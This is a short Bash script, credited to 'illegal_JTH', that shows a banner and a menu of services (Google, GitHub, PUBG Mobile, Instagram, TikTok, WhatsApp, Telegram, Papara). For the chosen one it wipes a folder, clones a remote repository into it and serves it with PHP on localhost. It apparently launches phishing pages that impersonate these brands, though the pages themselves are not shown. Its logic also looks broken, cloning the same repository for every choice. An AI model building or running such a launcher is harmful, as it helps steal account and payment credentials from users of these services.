#!/bin/bash

# Joker Tim Logo and creator info
clear
echo " ____"
echo "< ^^ >"
echo " ----"
echo "    \\"
echo "     \\"
echo "                                   .::!!!!!!!:."
echo "  .!!!!!:.                        .:!!!!!!!!!!!!"
echo "  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$"
echo "      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P"
echo "      $$$$$##WX!:      .<!!!!UW$$$$\"  $$$$$$$#$"
echo "      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*"
echo "      ^$$$B  $$$\\     $$$$$$$$$$$$   d$$R\""
echo "        \"*$bd$$$$      '*$$$$$$$$$$$o+#\""
echo "             \"\"\"\"          \"\"\"\"\""
echo "           _ _______ _    _   __  __  ____  _____"
echo "          | |__   __| |  | | |  \\/  |/ __ \\|  __ \\"
echo "          | |  | |  | |__| | | \\  / | |  | | |  | |"
echo "      _   | |  | |  |  __  | | |\\/| | |  | | |  | |"
echo "     | |__| |  | |  | |  | | | |  | | |__| | |__| |"
echo "      \\____/   |_|  |_|  |_| |_|  |_|\\____/|_____/"

# Menü seçenekleri
echo -e "\nCreated by: illegal_JTH"
echo -e "\nPlease select a section: \n"
echo "[1] Google"
echo "[2] GitHub"
echo "[3] PUBG Mobile"
echo "[4] Instagram"
echo "[5] TikTok"
echo "[6] WhatsApp"
echo "[7] Telegram"
echo "[8] Papara"

# Kullanıcıdan seçim al
echo -e "\n#root@Bölüm Seç=(\e[31mRed\e[0m)"
read -p "Enter your selection: " selection

# GitHub deposu
GITHUB_REPO="https://github.com/Illegal2/jthwep.git"

# Çekilecek dosyaların hedef klasörleri
FOLDER_GOOGLE="site/1/index.html"
FOLDER_GITHUB="site/2/dosyalar"
FOLDER_PUBG="site/3/dosyalar"
FOLDER_INSTAGRAM="site/4/dosyalar"
FOLDER_TIKTOK="site/5/dosyalar"
FOLDER_WHATSAPP="site/6/dosyalar"
FOLDER_TELEGRAM="site/7/dosyalar"
FOLDER_PAPARA="site/8/dosyalar"

# Fonksiyon: GitHub'dan çek ve sunucuyu başlat
download_and_run() {
    local target_folder=$1

    # Önce eski dosyaları temizle
    rm -rf "$target_folder"
    
    # GitHub'dan en son kodları indir
    git clone "$GITHUB_REPO" "$target_folder"
    
    # Sunucuyu başlat
    php -S localhost:8000 -t "$target_folder"
}

# Seçime göre işlem yap
case $selection in
  1)
    echo "Running Google site..."
    download_and_run "$FOLDER_GOOGLE"
    ;;
  2)
    echo "Running GitHub site..."
    download_and_run "$FOLDER_GITHUB"
    ;;
  3)
    echo "Running PUBG Mobile site..."
    download_and_run "$FOLDER_PUBG"
    ;;
  4)
    echo "Running Instagram site..."
    download_and_run "$FOLDER_INSTAGRAM"
    ;;
  5)
    echo "Running TikTok site..."
    download_and_run "$FOLDER_TIKTOK"
    ;;
  6)
    echo "Running WhatsApp site..."
    download_and_run "$FOLDER_WHATSAPP"
    ;;
  7)
    echo "Running Telegram site..."
    download_and_run "$FOLDER_TELEGRAM"
    ;;
  8)
    echo "Running Papara site..."
    download_and_run "$FOLDER_PAPARA"
    ;;
  *)
    echo "Hatalı seçim! Lütfen 1-8 arasında bir sayı giriniz."
    ;;
esac

echo "System link: http://localhost:8000"
